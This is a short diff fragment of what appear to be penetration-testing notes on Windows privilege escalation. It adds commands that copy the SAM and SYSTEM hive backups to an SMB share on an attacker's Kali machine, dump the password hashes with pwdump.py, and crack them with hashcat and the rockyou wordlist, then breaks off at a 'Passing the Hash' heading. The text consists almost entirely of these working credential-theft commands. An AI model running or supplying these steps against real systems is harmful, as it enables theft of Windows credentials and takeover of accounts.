@@ -286,8 +286,15 @@ copy the SAM files back to kali:
 copy C:\Windows\Repair\SAM \\192.168.1.244\tools\
 
 copy the SAM files back to kali:
-copy C:\Windows
+copy C:\Windows\Repair\SYSTEM \\192.168.1.244\tools\
 
+next use creddump to reveal the creds:
+python2 pwdump.py /tools/SYSTEM /tools/SAM
+
+crack the admin hashes or user hashes using hashdump
+hashcat -m 1000 --force hash /usr/share/wordlists/rockyou.txt
+
+                                                                        Passing the Hash
 
 
 
